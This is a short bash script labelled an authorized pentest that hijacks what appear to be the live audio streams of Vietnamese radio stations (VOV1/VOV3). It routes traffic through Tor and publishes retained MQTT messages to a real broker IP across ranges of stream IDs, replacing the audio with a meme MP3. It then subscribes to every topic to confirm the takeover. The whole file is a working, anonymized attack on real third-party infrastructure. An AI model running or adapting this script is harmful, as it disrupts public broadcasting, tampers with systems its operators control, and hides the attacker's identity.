#!/bin/bash
# FORCE_VOV_HIJACK_PEPPE.sh - Nuclear option (Authorized pentest)

PEPPE_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"

# HIJACK massivo TUTTI i possibili VOV IDs
for i in {88171961789418494..88171961789418500}; do
  topic="${i}:s:16"
  payload='{"n":"'"$i"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
  
  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -q -r -m "$payload" &
done

for i in {17541961789418494..17541961789418500}; do
  topic="${i}:s:16"
  payload='{"n":"'"$i"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
  
  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -q -r -m "$payload" &
done

echo "💣 50+ Peppe.mp3 streams HIJACKED (VOV1/VOV3)"
echo "⏳ Aspetta 10s poi check vov3.vov.vn F5"

# Monitor conferma
sleep 10
torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' -C 5 | grep -i "peppe\|brescia"
